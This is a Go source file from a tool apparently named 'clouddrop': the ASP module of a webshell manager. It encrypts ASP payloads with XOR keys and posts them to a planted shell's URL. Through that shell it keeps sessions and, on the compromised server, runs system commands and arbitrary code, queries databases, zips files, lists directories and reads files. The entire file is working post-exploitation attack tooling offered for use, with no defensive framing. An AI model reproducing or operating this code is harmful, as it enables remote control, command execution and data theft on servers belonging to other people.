package service

import (
	"clouddrop/pkg/util"
	"fmt"
	"log"
	"strings"
)

var AspSessions map[int]string

func (s *AspShell) GetShellType() string {
	return "asp"
}

func (s *AspShell) FreshSession(id int, shellURL string, password string) (string, error) {
	if AspSessions == nil {
		AspSessions = make(map[int]string)
	}

	dynamicPassword := util.DeriveXORKey(util.GeneratePasswordSeed())
	code, err := readPayload("asp", "Check.asp")
	if err != nil {
		return "", err
	}
	code = payloadWithSuffix(code, "\ncall main()")
	enCode := util.EncryptWithKeyOffset(code, dynamicPassword, util.RequestOffsetForShell(s.GetShellType()))

	AspSessions[id], err = util.PostRequestWithoutSession(shellURL, dynamicPassword, enCode)
	if err != nil {
		return "", err
	}
	log.Println("当前ASP会话 " + AspSessions[id])

	enResult, err := util.PostRequest(shellURL, dynamicPassword, enCode, AspSessions[id], s.GetShellType())
	if err != nil {
		return "", err
	}
	res, err := decryptASPResponse(strings.TrimSpace(enResult), dynamicPassword)
	if err != nil {
		return "", err
	}
	return strings.TrimSpace(decodeMaybeBase64(res)), nil
}

func (s *AspShell) aspHook(id int, shellURL string, code []byte, params map[string]string) (string, error) {
	dynamicPassword := util.DeriveXORKey(util.GeneratePasswordSeed())
	enCode := util.EncryptWithKeyOffset(code, dynamicPassword, util.RequestOffsetForShell(s.GetShellType()))
	options := util.ShellPostOptions{Session: AspSessions[id], ShellType: s.GetShellType()}
	if len(params) > 0 {
		options.Headers = encodeParamsHeader(params)
	}
	enResult, err := util.PostRequestWithOptions(shellURL, dynamicPassword, enCode, options)
	if err != nil {
		return "", err
	}
	res, err := decryptASPResponse(strings.TrimSpace(enResult.Body), dynamicPassword)
	if err != nil {
		return "", err
	}
	return decodeMaybeBase64(res), nil
}

func decryptASPResponse(body string, key string) (string, error) {
	res, err := util.DecryptWithKeyOffset(body, key, 5)
	if err == nil {
		return res, nil
	}
	raw := []byte(body)
	for i := range raw {
		raw[i] = raw[i] ^ key[(i+5)&15]
	}
	return string(raw), nil
}

func (s *AspShell) BaseInfo(id int, shellURL string, password string) (string, error) {
	code, err := readPayload("asp", "BaseInfo.asp")
	if err != nil {
		return "", err
	}
	code = payloadWithSuffix(code, "\ncall main()")
	return s.aspHook(id, shellURL, code, nil)
}

func (s *AspShell) ExecCommand(id int, command string, shellURL string, password string) (string, error) {
	osCode, err := readPayload("asp", "OS.asp")
	if err != nil {
		return "", err
	}
	osCode = payloadWithSuffix(osCode, "\ncall main()")
	osType, err := s.aspHook(id, shellURL, osCode, nil)
	if err != nil {
		return "", err
	}

	code, err := readPayload("asp", "CMD.asp")
	if err != nil {
		return "", err
	}
	cmdPath := strings.ReplaceAll(chooseWindowsCmd(decodeMaybeBase64(osType)), "C:/Windows/System32/cmd.exe", "cmd.exe")
	code = payloadWithSuffix(code, fmt.Sprintf("\ncall main(%s, %s, %s)", aspQuote(cmdPath), aspQuote("true"), aspQuote(command)))
	return s.aspHook(id, shellURL, code, nil)
}

func (s *AspShell) ExecCode(id int, code string, shellURL string, password string) (string, error) {
	payload, err := readPayload("asp", "ExecCode.asp")
	if err != nil {
		return "", err
	}
	payload = payloadWithSuffix(payload, "\ncall main()")
	return s.aspHook(id, shellURL, payload, map[string]string{"plugin_eval_code": code})
}

func (s *AspShell) ExecSql(id int, driver, host, port, user, pass, database, sql, option, encoding, shellURL, password string) (string, error) {
	code, err := readPayload("asp", "Database.asp")
	if err != nil {
		return "", err
	}
	if option == "" {
		option = "Array()"
	}
	if database == "" {
		code = payloadWithSuffix(code, fmt.Sprintf("\ncall listDatabases(%s, %s, %s, %s, %s, %s)", aspQuote(driver), aspQuote(host), aspQuote(port), aspQuote(user), aspQuote(pass), aspQuote(encoding)))
	} else {
		code = payloadWithSuffix(code, fmt.Sprintf("\ncall main(%s, %s, %s, %s, %s, %s, %s, %s, %s)", aspQuote(driver), aspQuote(host), aspQuote(port), aspQuote(user), aspQuote(pass), aspQuote(database), aspQuote(sql), option, aspQuote(encoding)))
	}
	return s.aspHook(id, shellURL, code, nil)
}

func (s *AspShell) FileZip(id int, srcPath string, toPath string, shellURL string, password string) (string, error) {
	code, err := readPayload("asp", "FileZip.asp")
	if err != nil {
		return "", err
	}
	code = payloadWithSuffix(code, fmt.Sprintf("\ncall main(%s, %s)", aspQuote(srcPath), aspQuote(toPath)))
	return s.aspHook(id, shellURL, code, nil)
}

func (s *AspShell) FileUnZip(id int, srcPath string, toPath string, shellURL string, password string) (string, error) {
	code, err := readPayload("asp", "FileUnZip.asp")
	if err != nil {
		return "", err
	}
	code = payloadWithSuffix(code, fmt.Sprintf("\ncall main(%s, %s)", aspQuote(srcPath), aspQuote(toPath)))
	return s.aspHook(id, shellURL, code, nil)
}

func (s *AspShell) FileList(id int, path string, shellURL string, password string) (string, error) {
	code, err := readPayload("asp", "FileList.asp")
	if err != nil {
		return "", err
	}
	code = payloadWithSuffix(code, fmt.Sprintf("\ncall main(%s)", aspQuote(path)))
	return s.aspHook(id, shellURL, code, nil)
}

func (s *AspShell) FileShow(id int, path string, shellURL string, password string) (string, error) {
	code, err := readPayload("asp", "FileShow.asp")
	if err != nil {
		return "", err
	}
	code = payloadWithSuffix(code, fmt.Sprintf("\ncall main(%s)", aspQuote(path)))
	return s.aspHook(id, shellURL, code, nil)
}
